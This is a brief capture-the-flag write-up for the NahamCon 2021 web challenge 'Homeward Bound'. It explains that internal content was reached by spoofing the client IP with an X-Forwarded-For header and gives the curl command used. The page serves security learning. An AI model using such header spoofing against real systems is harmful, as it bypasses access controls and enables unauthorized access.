---
layout: load_md
title: The White Circle | Nahamcon 2021 | Homeward Bound Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Nahamcon 2021
parent: nahamcon_2021
category: web
challenge: Homeward Bound
tags: "web"
---

<h1 class="heading card-title white-text">Nahamcon 2021</h1>

## Homeward Bound

In this challenge we were supposed to access internal files by spoofing client IP address, this can be done using `X-Forwarded-For` header

```
$ curl -H “X-Forwarded-For: 127.0.0.1” http://challenge.nahamcon.com:31428/
```
